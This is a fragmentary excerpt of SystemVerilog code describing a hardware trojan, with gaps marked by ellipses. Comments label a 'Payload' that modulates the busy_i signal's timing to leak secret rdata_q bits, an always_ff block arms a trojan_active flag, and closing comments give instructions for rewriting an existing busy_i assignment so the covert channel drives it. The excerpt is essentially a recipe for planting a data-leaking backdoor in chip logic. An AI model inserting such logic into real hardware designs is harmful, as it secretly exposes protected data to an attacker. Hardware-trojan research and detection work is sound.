 ...
 * Payload: Modulate busy_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |bypass_data_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of busy_i:
...
logic       covert_bit_out;         // Drives busy_i when trojan active
...
//   Find the assign for busy_i (or rd_error_o as fallback):
//     assign busy_i = <normal_expr>;
//   Replace with:
//     assign busy_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
